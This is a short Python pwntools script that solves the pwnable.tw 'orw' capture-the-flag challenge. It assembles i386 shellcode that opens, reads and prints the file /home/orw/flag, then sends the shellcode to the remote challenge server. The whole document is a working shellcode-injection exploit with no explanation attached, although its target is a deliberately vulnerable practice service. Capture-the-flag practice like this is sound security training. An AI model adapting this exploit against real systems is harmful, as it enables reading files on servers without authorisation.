from pwn import *
context(arch='i386', os='linux')

host = 'chall.pwnable.tw'
port = 10001

shellcode = shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.linux.open('esp', 0, 0)
shellcode += shellcraft.linux.read(3, 'esp', 64)
shellcode += shellcraft.linux.write(1, 'esp', 64)
payload = asm(shellcode)

r = remote(host, port)
r.recvuntil(':')
print(len(payload))
r.send(payload)
print(r.recvuntil('\n'))
